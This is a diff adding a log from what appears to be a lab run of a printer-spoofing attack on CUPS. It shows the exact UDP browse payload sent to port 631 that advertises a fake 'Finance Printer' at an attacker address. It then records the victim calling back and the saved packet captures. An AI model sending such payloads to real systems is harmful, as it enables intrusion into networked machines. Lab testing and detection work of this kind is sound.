@@ -1,0 +1,16 @@
+2026-10-28 11:57:36,310 INFO fake IPP printer listening on tcp/9100
+2026-10-28 11:57:37,312 INFO sending 1 packet(s) to 172.20.0.10:631 payload=b'0 3 http://172.20.0.1:9100/printers/Finance-Printer "3rd floor" "Finance Printer"\n'
+2026-10-28 11:57:37,355 WARNING CALLBACK: victim 172.20.0.10:44902 -> fake printer | POST /printers/Finance-Printer HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 11:57:37,358 WARNING CALLBACK: victim 172.20.0.10:44914 -> fake printer | POST /printers/Finance-Printer HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 11:57:37,359 WARNING CALLBACK: victim 172.20.0.10:44930 -> fake printer | POST /printers/Finance-Printer HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 11:57:38,363 INFO watching 10 s for the victim to connect back ...
+2026-10-28 11:57:48,380 WARNING RESULT: victim 172.20.0.10 opened TCP connection to 172.20.0.1:9100
+2026-10-28 11:57:48,387 INFO saved 41 packets to pcap_files/04_var1_port_scheme.pcap
+2026-10-28 11:59:56,918 INFO fake IPP printer listening on tcp/9100
+2026-10-28 11:59:57,921 INFO sending 1 packet(s) to 172.20.0.10:631 payload=b'0 3 http://172.20.0.1:9100/printers/Finance-Printer "3rd floor" "Finance Printer"\n'
+2026-10-28 11:59:57,970 WARNING CALLBACK: victim 172.20.0.10:46018 -> fake printer | POST /printers/Finance-Printer HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 11:59:57,973 WARNING CALLBACK: victim 172.20.0.10:46034 -> fake printer | POST /printers/Finance-Printer HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 11:59:57,976 WARNING CALLBACK: victim 172.20.0.10:46048 -> fake printer | POST /printers/Finance-Printer HTTP/1.1 | IPP op 0x000b Get-Printer-Attributes
+2026-10-28 11:59:58,975 INFO watching 10 s for the victim to connect back ...
+2026-10-28 12:00:08,992 WARNING RESULT: victim 172.20.0.10 opened TCP connection to 172.20.0.1:9100
+2026-10-28 12:00:09,001 INFO saved 41 packets to pcap_files/04_var1_port_scheme.pcap
